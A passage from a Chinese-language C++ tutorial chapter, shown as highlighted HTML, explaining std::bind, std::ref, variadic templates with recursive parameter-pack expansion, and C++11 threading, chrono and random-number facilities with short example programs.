class="meta-string">&lt;functional&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b, <span class="keyword">int</span> c)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;a=&quot;</span> &lt;&lt; a &lt;&lt; <span class="string">&quot;, b=&quot;</span> &lt;&lt; b &lt;&lt; <span class="string">&quot;, c=&quot;</span> &lt;&lt; c &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 绑定第一个参数为 100，第二个参数由调用者提供 (_1)，第三个参数为 300</span></span><br><span class="line">    <span class="keyword">auto</span> bound_func = <span class="built_in">std</span>::bind(func, <span class="number">100</span>, <span class="built_in">std</span>::placeholders::_1, <span class="number">300</span>);</span><br><span class="line">    bound_func(<span class="number">200</span>); <span class="comment">// 调用 func(100, 200, 300)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用 Lambda 实现相同效果</span></span><br><span class="line">    <span class="keyword">auto</span> lambda_func = [](<span class="keyword">int</span> b)&#123; func(<span class="number">100</span>, b, <span class="number">300</span>); &#125;;</span><br><span class="line">    lambda_func(<span class="number">200</span>); <span class="comment">// 调用 func(100, 200, 300)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><strong><code>std::ref</code> 和 <code>std::cref</code>:</strong> (在 <code>&lt;functional&gt;</code> 中) 当你想通过值传递的包装器（如 <code>std::bind</code>, <code>std::thread</code> 构造函数, 甚至某些情况下的 <code>std::function</code>）传递参数的<strong>引用</strong>时，需要使用 <code>std::ref</code> (用于非 const 引用) 或 <code>std::cref</code> (用于 const 引用) 来包装参数。它们创建了一个轻量级的引用包装器对象。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;functional&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;thread&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">modify_vector</span><span class="params">(<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; vec)</span> </span>&#123; <span class="comment">// 接受引用</span></span><br><span class="line">    <span class="keyword">if</span> (!vec.empty()) &#123;</span><br><span class="line">        vec[<span class="number">0</span>] = <span class="number">100</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; my_vec = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// std::bind 默认按值复制参数</span></span><br><span class="line">    <span class="comment">// auto bound_copy = std::bind(modify_vector, my_vec); // 错误或无效，bind 复制了 vector</span></span><br><span class="line">    <span class="comment">// bound_copy(); // 修改的是副本</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用 std::ref 传递引用</span></span><br><span class="line">    <span class="keyword">auto</span> bound_ref = <span class="built_in">std</span>::bind(modify_vector, <span class="built_in">std</span>::ref(my_vec));</span><br><span class="line">    bound_ref(); <span class="comment">// 正确调用 modify_vector(my_vec)</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Vector after bind+ref: &quot;</span> &lt;&lt; my_vec[<span class="number">0</span>] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 100</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// std::thread 构造函数也复制参数，需要 std::ref 传递引用</span></span><br><span class="line">    my_vec[<span class="number">0</span>] = <span class="number">1</span>; <span class="comment">// Reset</span></span><br><span class="line">    <span class="comment">// std::thread t1(modify_vector, my_vec); // 线程操作的是 my_vec 的副本</span></span><br><span class="line">    <span class="function"><span class="built_in">std</span>::thread <span class="title">t2</span><span class="params">(modify_vector, <span class="built_in">std</span>::ref(my_vec))</span></span>; <span class="comment">// 线程操作的是 my_vec 的引用</span></span><br><span class="line">    <span class="comment">// t1.join();</span></span><br><span class="line">    t2.join();</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Vector after thread+ref: &quot;</span> &lt;&lt; my_vec[<span class="number">0</span>] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 100</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><p>总之，<code>std::function</code> 是一个强大的通用函数包装器，提供了极大的灵活性，但在性能敏感的场景下需要注意其潜在开销，并考虑使用模板、函数指针或直接传递 Lambda 等替代方案。</p><h2 id="18-6-可变参数模板"><a href="#18-6-可变参数模板" class="headerlink" title="18.6 可变参数模板"></a>18.6 可变参数模板</h2><p>在 C++11 之前，模板（函数模板和类模板）通常只能接受固定数量的模板参数。如果你想编写一个可以接受任意数量参数的函数（类似于 C 语言中的 <code>printf</code>），通常需要依赖 C 风格的可变参数机制 (<code>&lt;cstdarg&gt;</code>)，这种机制不是类型安全的。</p><p>C++11 引入了<strong>可变参数模板 (Variadic Templates)**，允许模板（包括函数模板和类模板）接受</strong>任意数量、任意类型**的模板参数，并在编译时进行类型安全的处理。</p><h3 id="18-6-1-模板和函数参数包"><a href="#18-6-1-模板和函数参数包" class="headerlink" title="18.6.1 模板和函数参数包"></a>18.6.1 模板和函数参数包</h3><p>可变参数模板的核心是**参数包 (Parameter Pack)**。参数包有两种：</p><ol><li><p><strong>模板参数包 (Template Parameter Pack):</strong> 代表零个或多个模板参数（类型参数、非类型参数或模板参数）。</p><ul><li>  语法：<code>typename... Args</code> 或 <code>class... Args</code> (对于类型参数包)，<code>Type... args</code> (对于非类型参数包)。</li><li>  <code>...</code> (省略号) 是关键部分，表示这是一个参数包。</li></ul></li><li><p><strong>函数参数包 (Function Parameter Pack):</strong> 代表零个或多个函数参数。</p><ul><li>  语法：<code>Args... args</code>，其中 <code>Args</code> 是一个模板参数包。</li></ul></li></ol><p><strong>示例：定义一个接受任意数量参数的函数模板</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义可变参数函数模板 show_list</span></span><br><span class="line"><span class="comment">// Args 是一个模板参数包 (代表零个或多个类型)</span></span><br><span class="line"><span class="comment">// args 是一个函数参数包 (代表零个或多个对应类型的参数)</span></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span>... Args&gt;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">show_list</span><span class="params">(Args... args)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 如何处理 args？见下文</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Number of arguments: &quot;</span> &lt;&lt; <span class="keyword">sizeof</span>...(Args) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="comment">// 或者 sizeof...(args) 也可以</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    show_list();                 <span class="comment">// Args 为空, args 为空. 输出: Number of arguments: 0</span></span><br><span class="line">    show_list(<span class="number">1</span>);                <span class="comment">// Args = &#123;int&#125;, args = &#123;1&#125;. 输出: Number of arguments: 1</span></span><br><span class="line">    show_list(<span class="number">1</span>, <span class="string">&quot;hello&quot;</span>);       <span class="comment">// Args = &#123;int, const char*&#125;, args = &#123;1, &quot;hello&quot;&#125;. 输出: Number of arguments: 2</span></span><br><span class="line">    show_list(<span class="number">1</span>, <span class="number">3.14</span>, <span class="string">&#x27;c&#x27;</span>);     <span class="comment">// Args = &#123;int, double, char&#125;, args = &#123;1, 3.14, &#x27;c&#x27;&#125;. 输出: Number of arguments: 3</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>sizeof...(Args)</code> 或 <code>sizeof...(args)</code> 运算符可以在编译时获取参数包中的参数数量。</p><h3 id="18-6-2-展开参数包"><a href="#18-6-2-展开参数包" class="headerlink" title="18.6.2 展开参数包"></a>18.6.2 展开参数包</h3><p>仅仅能接受任意数量的参数还不够，我们还需要一种方法来<strong>处理 (展开, Unpack)</strong> 参数包中的每一个参数。在 C++11 中，展开参数包通常需要使用<strong>递归 (Recursion)</strong> 或其他一些模板技巧。C++17 引入了更简洁的**折叠表达式 (Fold Expressions)**，但这里我们主要关注 C++11 的方法。</p><p>展开参数包的关键在于<strong>模式匹配</strong>和<strong>递归调用</strong>：设计一个函数模板，它处理参数包中的第一个参数，然后用剩余的参数递归调用自身。还需要一个处理参数包为空（递归终止）的基本情况。</p><h3 id="18-6-3-在可变参数模板函数中使用递归"><a href="#18-6-3-在可变参数模板函数中使用递归" class="headerlink" title="18.6.3 在可变参数模板函数中使用递归"></a>18.6.3 在可变参数模板函数中使用递归</h3><p>最常见的展开方式是定义两个函数模板：</p><ol><li> 一个<strong>递归</strong>版本，接受至少一个参数，处理第一个参数，然后用剩余参数调用自身。</li><li> 一个<strong>基本情况</strong>版本，接受零个参数，作为递归的终止条件。</li></ol><p><strong>示例：递归打印所有参数</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 基本情况：当参数包为空时调用此版本，终止递归</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_values</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 递归结束时打印换行</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 递归版本：处理第一个参数，然后用剩余参数递归调用</span></span><br><span class="line"><span class="comment">// Args 是模板参数包 (代表剩余参数的类型)</span></span><br><span class="line"><span class="comment">// args 是函数参数包 (代表剩余参数的值)</span></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T, <span class="keyword">typename</span>... Args&gt;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_values</span><span class="params">(<span class="keyword">const</span> T&amp; first_arg, <span class="keyword">const</span> Args&amp;... rest_args)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 1. 处理第一个参数</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; first_arg;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. 如果还有剩余参数，打印分隔符并递归调用</span></span><br><span class="line">    <span class="function"><span class="keyword">if</span> <span class="title">constexpr</span> <span class="params">(<span class="keyword">sizeof</span>...(Args) &gt; <span class="number">0</span>)</span> </span>&#123; <span class="comment">// C++17 if constexpr, 简化条件编译</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;, &quot;</span>;</span><br><span class="line">        print_values(rest_args...); <span class="comment">// 将剩余参数包展开并传递给下一次调用</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        print_values(); <span class="comment">// 调用基本情况版本，打印换行</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// C++11 写法 (没有 if constexpr):</span></span><br><span class="line">    <span class="comment">// if (sizeof...(Args) &gt; 0) &#123;</span></span><br><span class="line">    <span class="comment">//     std::cout &lt;&lt; &quot;, &quot;;</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">    <span class="comment">// print_values(rest_args...); // 递归调用，最终会调用到 print_values() 版本</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Printing values:\n&quot;</span>;</span><br><span class="line">    print_values(<span class="number">1</span>, <span class="string">&quot;hello&quot;</span>, <span class="number">3.14</span>, <span class="string">&#x27;a&#x27;</span>); <span class="comment">// 输出: 1, hello, 3.14, a</span></span><br><span class="line">    print_values(<span class="string">&quot;Single argument&quot;</span>);      <span class="comment">// 输出: Single argument</span></span><br><span class="line">    print_values();                       <span class="comment">// 输出: (空行)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>调用过程分析 <code>print_values(1, &quot;hello&quot;, 3.14, &#39;a&#39;)</code>:</strong></p><ol><li>调用 <code>print_values&lt;int, const char*, double, char&gt;(1, &quot;hello&quot;, 3.14, &#39;a&#39;)</code><ul><li>  <code>first_arg</code> = 1, <code>rest_args...</code> = {“hello”, 3.14, ‘a’}</li><li>  输出 “1, “</li><li>  递归调用 <code>print_values(&quot;hello&quot;, 3.14, &#39;a&#39;)</code></li></ul></li><li>调用 <code>print_values&lt;const char*, double, char&gt;(&quot;hello&quot;, 3.14, &#39;a&#39;)</code><ul><li>  <code>first_arg</code> = “hello”, <code>rest_args...</code> = {3.14, ‘a’}</li><li>  输出 “hello, “</li><li>  递归调用 <code>print_values(3.14, &#39;a&#39;)</code></li></ul></li><li>调用 <code>print_values&lt;double, char&gt;(3.14, &#39;a&#39;)</code><ul><li>  <code>first_arg</code> = 3.14, <code>rest_args...</code> = {‘a’}</li><li>  输出 “3.14, “</li><li>  递归调用 <code>print_values(&#39;a&#39;)</code></li></ul></li><li>调用 <code>print_values&lt;char&gt;(&#39;a&#39;)</code><ul><li>  <code>first_arg</code> = ‘a’, <code>rest_args...</code> = {} (空包)</li><li>  输出 “a”</li><li>  递归调用 <code>print_values()</code></li></ul></li><li>调用 <code>print_values()</code> (基本情况)<ul><li>  输出 <code>std::endl</code></li><li>  递归结束</li></ul></li></ol><p><strong>展开语法 <code>rest_args...</code>:</strong> 当在函数调用中对函数参数包使用 <code>...</code> 时，它会将包中的每个元素展开，作为独立的参数传递给函数。</p><p><strong>其他展开技巧 (C++11):</strong></p><p>虽然递归是最常见的方式，但也可以使用其他技巧，例如利用初始化列表或数组的逗号运算符特性来展开，但这些技巧通常更复杂且可读性较差。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用初始化列表展开 (技巧性较强)</span></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span>... Args&gt;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_values_trick</span><span class="params">(<span class="keyword">const</span> Args&amp;... args)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 创建一个临时 int 数组，利用初始化列表和逗号运算符</span></span><br><span class="line">    <span class="comment">// 对包中的每个参数执行 (std::cout &lt;&lt; arg &lt;&lt; &quot; &quot;, 0)</span></span><br><span class="line">    <span class="comment">// 结果是 &#123;0, 0, 0, ...&#125;，但副作用是打印了参数</span></span><br><span class="line">    <span class="keyword">int</span> dummy[] = &#123;<span class="number">0</span>, ( (<span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; args &lt;&lt; <span class="string">&quot; &quot;</span>), <span class="number">0</span> )... &#125;;</span><br><span class="line">    <span class="comment">// (void)dummy; // 避免未使用变量警告 (可选)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">     print_values_trick(<span class="number">10</span>, <span class="string">&quot;world&quot;</span>, <span class="number">0.5</span>); <span class="comment">// 输出: 10 world 0.5</span></span><br><span class="line">     <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这种技巧利用了 C++11 中 <code>...</code> 可以在表达式中展开参数包的特性 <code>(pattern)...</code>，其中 <code>pattern</code> 会对包中的每个元素应用一次。</p><p>可变参数模板是 C++ 元编程和泛型编程的强大工具，使得编写能够处理任意数量参数的类型安全函数（如自定义的 <code>printf</code>、<code>make_tuple</code>、<code>emplace_back</code> 等）成为可能。</p><h2 id="18-7-C-11新增的其他功能"><a href="#18-7-C-11新增的其他功能" class="headerlink" title="18.7 C++11新增的其他功能"></a>18.7 C++11新增的其他功能</h2><p>除了前面章节已经详细讨论或回顾的主要特性（如 <code>auto</code>, <code>nullptr</code>, 统一初始化, 移动语义, Lambda, 智能指针, 范围 <code>for</code>, 新类功能, 可变参数模板等）之外，C++11 标准还引入了许多其他重要的功能和库，进一步增强了语言的能力。本节将简要介绍其中的一些。</p><h3 id="18-7-1-并行编程"><a href="#18-7-1-并行编程" class="headerlink" title="18.7.1 并行编程"></a>18.7.1 并行编程</h3><p>C++11 首次在标准库层面提供了对<strong>多线程并发编程</strong>的支持，主要定义在 <code>&lt;thread&gt;</code>, <code>&lt;mutex&gt;</code>, <code>&lt;condition_variable&gt;</code>, <code>&lt;future&gt;</code>, <code>&lt;atomic&gt;</code> 等头文件中。</p><ul><li><strong><code>std::thread</code>:</strong> 用于创建和管理线程。允许函数或可调用对象在独立的线程中执行。  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;thread&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">worker_thread</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Worker thread running.\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="built_in">std</span>::thread <span class="title">t</span><span class="params">(worker_thread)</span></span>; <span class="comment">// 创建新线程并执行 worker_thread</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Main thread running.\n&quot;</span>;</span><br><span class="line">    t.join(); <span class="comment">// 等待 worker_thread 执行完毕</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><strong>互斥量 (<code>std::mutex</code>, <code>std::lock_guard</code>, <code>std::unique_lock</code>):</strong> 用于保护共享数据，防止多个线程同时访问导致的数据竞争。<code>lock_guard</code> 和 <code>unique_lock</code> 提供了 RAII 风格的锁管理，确保互斥量能被正确释放。  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;mutex&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;thread&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="built_in">std</span>::mutex data_mutex;</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; shared_data;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add_data</span><span class="params">(<span class="keyword">int</span> val)</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="built_in">std</span>::lock_guard&lt;<span class="built_in">std</span>::mutex&gt; <span class="title">lock</span><span class="params">(data_mutex)</span></span>; <span class="comment">// 自动加锁，离开作用域时自动解锁</span></span><br><span class="line">    shared_data.push_back(val);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>  <strong>条件变量 (<code>std::condition_variable</code>):</strong> 用于线程间的同步，允许一个线程等待某个条件变为真（由另一个线程通知）。通常与 <code>std::mutex</code> 和 <code>std::unique_lock</code> 配合使用。</li><li><strong>原子操作 (<code>std::atomic&lt;T&gt;</code>):</strong> 提供对基本类型的原子操作（如读取、写入、增减、比较交换），保证这些操作在多线程环境下不会被打断，避免了数据竞争，通常比使用互斥量更高效。  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;atomic&gt;</span></span></span><br><span class="line"><span class="built_in">std</span>::atomic&lt;<span class="keyword">int</span>&gt; counter = <span class="number">0</span>;</span><br><span class="line"><span class="comment">// counter++; // 原子地自增</span></span><br></pre></td></tr></table></figure></li><li>  <strong>异步操作 (<code>std::async</code>, <code>std::future</code>, <code>std::promise</code>):</strong> 提供了一种更高级的并发模型，允许异步地执行任务并获取其结果。<code>std::async</code> 可以启动一个异步任务，返回一个 <code>std::future</code> 对象，通过 <code>future</code> 可以在稍后获取任务的返回值或等待任务完成。<code>promise</code> 则用于在一个线程中设置值或异常，供另一个线程通过关联的 <code>future</code> 获取。</li></ul><p>C++11 的并发支持使得编写可移植的多线程程序成为可能。</p><h3 id="18-7-2-新增的库"><a href="#18-7-2-新增的库" class="headerlink" title="18.7.2 新增的库"></a>18.7.2 新增的库</h3><p>C++11 标准库增加了几个实用的新组件：</p><ul><li><strong><code>&lt;chrono&gt;</code>:</strong> 提供了处理<strong>时间</strong>和<strong>时间段</strong>的类型安全、精确的库。包括时钟 (<code>system_clock</code>, <code>steady_clock</code>, <code>high_resolution_clock</code>)、时间点 (<code>time_point</code>) 和时间段 (<code>duration</code>)。  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;chrono&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;thread&gt; // for sleep_for</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">auto</span> start = <span class="built_in">std</span>::chrono::high_resolution_clock::now();</span><br><span class="line">    <span class="built_in">std</span>::this_thread::sleep_for(<span class="built_in">std</span>::chrono::milliseconds(<span class="number">50</span>)); <span class="comment">// 休眠 50 毫秒</span></span><br><span class="line">    <span class="keyword">auto</span> end = <span class="built_in">std</span>::chrono::high_resolution_clock::now();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::chrono::duration&lt;<span class="keyword">double</span>, <span class="built_in">std</span>::milli&gt; elapsed = end - start; <span class="comment">// 计算毫秒差</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Elapsed time: &quot;</span> &lt;&lt; elapsed.count() &lt;&lt; <span class="string">&quot; ms\n&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><strong><code>&lt;random&gt;</code>:</strong> 提供了比 C 风格 <code>rand()</code> 更强大、更灵活的<strong>随机数生成</strong>工具。包括多种随机数引擎（如 <code>mt19937</code>）和分布（如 <code>uniform_int_distribution</code>, <code>normal_distribution</code>）。  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;random&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::random_device rd; <span class="comment">// 用于生成种子 (可能基于硬件)</span></span><br><span class="line">    <span class="function"><span class="built_in">std</span>::mt19937 <span class="title">gen</span><span class="params">(rd())</span></span>; <span class="comment">// Mersenne Twister 引擎</span></span><br><span class="line">    <span class="function"><span class="built_in">std</span>::uniform_int_distribution&lt;&gt; <span class="title">distrib</span><span class="params">(<span class="number">1</span>, <span class="number">6</span>)</span></span>; <span class="comment">// 均匀分布 [1, 6]</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Rolling a die: 